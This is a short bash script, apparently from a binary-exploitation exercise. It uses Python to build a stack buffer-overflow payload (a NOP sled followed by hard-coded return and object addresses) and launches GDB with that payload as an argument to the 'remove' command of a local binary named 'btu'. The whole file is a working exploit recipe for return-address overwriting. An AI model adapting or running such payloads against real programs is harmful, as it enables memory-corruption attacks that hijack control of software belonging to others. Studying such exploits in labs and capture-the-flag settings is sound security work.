#!/bin/bash

# Generate the payload using Python
PAYLOAD=$(python3 -c "import sys; sys.stdout.buffer.write(
    b'\x90'*52 +                      # NOP sled
    b'\x80\xb0\x04\x08' +             # exmatriculate ret address 
    b'\x90\x90\x90\x90' +             # No exit so nop
    b'\x80\x0c\x05\x08' +             # this object 
    b'\xff\x1c\x45\x6a'               # klaus -id 
)")

# Launch GDB with the binary and crafted payload as arguments
gdb -q ./build/bin/btu --args ./build/bin/btu remove 1782914303 "$PAYLOAD"
